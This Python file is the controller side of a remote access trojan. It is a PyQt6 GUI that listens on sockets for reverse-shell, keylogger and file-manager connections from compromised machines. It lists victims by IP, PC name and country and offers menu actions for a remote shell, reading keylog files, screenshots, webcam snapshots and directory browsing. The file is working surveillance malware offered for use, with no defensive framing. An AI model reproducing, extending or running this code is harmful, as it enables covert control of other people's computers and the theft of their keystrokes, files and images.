import io
import json
import socket
import threading

import  random

from terminal_ui import TerminalWindow as Ui_MainWindow2

from treeview import FileManagerServer
from keylog_ui import  MainWindow as Ui_KeylogWindow
from PyQt6 import QtCore, QtWidgets
from PyQt6.QtCore import QPoint
from PyQt6.QtWidgets import QApplication, QMainWindow, QTableWidgetItem, QTableWidget, QPushButton, QMenu
from Client_Handler import Client
import psutil

def get_wifi_ipv4():
    for interface, addrs in psutil.net_if_addrs().items():
        if "Wi-Fi" in interface or "Wireless" in interface:  # Adjust this for different adapter names
            for addr in addrs:
                if addr.family == socket.AF_INET:  # Check for IPv4
                    return addr.address
    return None
# SERVER_HOST = socket.gethostbyname(socket.gethostname())

SERVER_HOST = get_wifi_ipv4()
print(SERVER_HOST)

SERVER_PORT_KEYLOGGER = 5000
SERVER_PORT_SHELL = 5005
SERVER_PORT_MANAGE_FILE = 5050
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"
# create a socket object
s1 = socket.socket()
s1.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s1.bind((SERVER_HOST,SERVER_PORT_SHELL))
s1.listen(5)

s2 = socket.socket()
s2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s2.bind((SERVER_HOST,SERVER_PORT_KEYLOGGER))
s2.listen(5)

s3 = socket.socket()
s3.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s3.bind((SERVER_HOST,SERVER_PORT_MANAGE_FILE))
s3.listen(5)

def reverse_shell(s1):
    global cur_client
    print(f"Listening as {SERVER_HOST}:{SERVER_PORT_SHELL} ...")
    while True:
        socket, client_add = s1.accept()
        print(f"{client_add[0]}:{client_add[1]} Connected!\n")
        cwd = socket.recv(BUFFER_SIZE).decode()
        # ui.second_window.append(Ui_MainWindow2())
        ui.second_window[ui.cnt].print_text(f"{cwd} $>")
        ui.second_window[ui.cnt].socket = socket
        infor = socket.recv(BUFFER_SIZE).decode()
        list_infor = infor.split(SEPARATOR)
        ui.add_row(list_infor[0], list_infor[1], list_infor[2])
        ui.keylog_window[ui.cnt].setWindowTitle(list_infor[1] + "@KeyLog")
        ui.keylog_window[ui.cnt].filename = list_infor[1] + '.txt'
        # ui.keylog_window[ui.cnt].show()
        cur_client.increase()
        if cur_client.cnt == 3:
            list_client.append(cur_client)
            cur_client.cnt += 1
            ui.cnt+=1
            cur_client = Client(ui.cnt, ui)

def key_logger(s2):
    global cur_client
    print(f"Listening as {SERVER_HOST}:{SERVER_PORT_KEYLOGGER} ...")
    while True:
        socket, client_add = s2.accept()
        # ui.keylog_window.append(Ui_KeylogWindow())
        cur_client.add_keylog(socket)
        cur_client.increase()
        if cur_client.cnt == 3:
            list_client.append(cur_client)
            cur_client.cnt += 1
            ui.cnt += 1
            cur_client = Client(ui.cnt, ui)
def manage_file(s3):
    global cur_client
    print(f"Listening as {SERVER_HOST}:{SERVER_PORT_MANAGE_FILE} ...")
    while True:
        socket, client_add = s3.accept()
        # ui.manage_file_window.append(FileManagerServer())
        ui.manage_file_window[ui.cnt].socket = socket
        cur_client.add_manage_file(socket)
        print(f"{client_add[0]}:{client_add[1]} Connected!\n")
        cur_client.increase()
        if cur_client.cnt == 3:
            list_client.append(cur_client)
            cur_client.cnt += 1
            ui.cnt += 1
            cur_client = Client(ui.cnt, ui)



class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(1000, 800)
        self.centralwidget = QtWidgets.QWidget(parent=MainWindow)
        self.centralwidget.setObjectName("centralwidget")

        self.cnt = 0

        self.tableWidget = QtWidgets.QTableWidget(parent=self.centralwidget)
        self.tableWidget.setGeometry(QtCore.QRect(0, 40, 1000, 600))
        self.tableWidget.setMinimumSize(QtCore.QSize(300, 0))
        self.tableWidget.setRowCount(0)
        self.tableWidget.setColumnCount(4)
        self.tableWidget.setObjectName("tableWidget")

        # Set headers
        self.tableWidget.setHorizontalHeaderItem(0, QTableWidgetItem("IP Address"))
        self.tableWidget.setHorizontalHeaderItem(1, QTableWidgetItem("PC"))
        self.tableWidget.setHorizontalHeaderItem(2, QTableWidgetItem("Country"))
        self.tableWidget.setHorizontalHeaderItem(3, QTableWidgetItem("Status"))

        # Set column widths
        self.tableWidget.setColumnWidth(0, 250)
        self.tableWidget.setColumnWidth(1, 250)
        self.tableWidget.setColumnWidth(2, 250)
        self.tableWidget.setColumnWidth(3, 230)

        # Enable custom context menu
        self.tableWidget.setContextMenuPolicy(QtCore.Qt.ContextMenuPolicy.CustomContextMenu)

        # Connect right-click signal to the custom slot
        self.tableWidget.customContextMenuRequested.connect(self.onRightClick)
        self.second_window = []
        self.second_window.append(Ui_MainWindow2())
        self.manage_file_window = []
        # self.keylog_window = None
        self.keylog_window = []
        self.second_window.append(Ui_MainWindow2())
        self.manage_file_window.append(FileManagerServer())
        self.keylog_window.append(Ui_KeylogWindow())
        self.second_window.append(Ui_MainWindow2())
        self.manage_file_window.append(FileManagerServer())
        self.keylog_window.append(Ui_KeylogWindow())
        MainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QtWidgets.QMenuBar(parent=MainWindow)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 800, 21))
        MainWindow.setMenuBar(self.menubar)
        self.statusbar = QtWidgets.QStatusBar(parent=MainWindow)
        MainWindow.setStatusBar(self.statusbar)

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "MainWindow"))

    def add_row(self, ip="", pc="", country="", status="connected"):
        # Add a new row to the table
        rowPosition = self.tableWidget.rowCount()
        self.tableWidget.insertRow(rowPosition)
        self.tableWidget.setItem(rowPosition, 0, QTableWidgetItem(ip))
        self.tableWidget.setItem(rowPosition, 1, QTableWidgetItem(pc))
        self.tableWidget.setItem(rowPosition, 2, QTableWidgetItem(country))
        self.tableWidget.setItem(rowPosition, 3, QTableWidgetItem(status))

    def onRightClick(self, position: QPoint):
        # Find the row that was clicked
        row = self.tableWidget.rowAt(position.y())

        if row != -1:  # Make sure a valid row is clicked
            print(f"Right-clicked on row {row}")

            # Create the context menu
            contextMenu = QMenu(self.tableWidget)

            # Add actions to the menu
            remoteShell = contextMenu.addAction("Remote shell")
            keylog = contextMenu.addAction("Keylog file")
            screenShot = contextMenu.addAction("Screen shot")
            webCam = contextMenu.addAction("Webcam snapshot")
            showDir = contextMenu.addAction("Show directory")

            # Execute the context menu and get the selected action
            action = contextMenu.exec(self.tableWidget.mapToGlobal(position))

            # Handle the selected action
            if action == remoteShell:
                print(f"call remoteshell at {row}")
                self.second_window[row].show()
            elif action == keylog:
                ui.keylog_window[row].readfile()
                ui.keylog_window[row].show()
            elif action == screenShot:
                # self.srceen_shot()
                ui.second_window[row].screen_shot("src")
            elif action == webCam:
                ui.second_window[row].screen_shot("webcam")
            elif action == showDir:
                ui.manage_file_window[row].show()

    def processInput(self, text):
        # Process the user input
        print(f"User entered: {text}")  # Handle the input as needed
        self.textEdit.append(f"Output: {text}")  # Example output

import sys
app = QtWidgets.QApplication(sys.argv)
MainWindow = QtWidgets.QMainWindow()
ui = Ui_MainWindow()
ui.setupUi(MainWindow)
MainWindow.show()
list_client = []
cur_client  = Client(ui.cnt,ui)

t1 = threading.Thread(target=reverse_shell, args=(s1,))
t2 = threading.Thread(target=key_logger, args=(s2,))
t3 = threading.Thread(target=manage_file, args=(s3,))
t1.start()
t2.start()
t3.start()




sys.exit(app.exec())



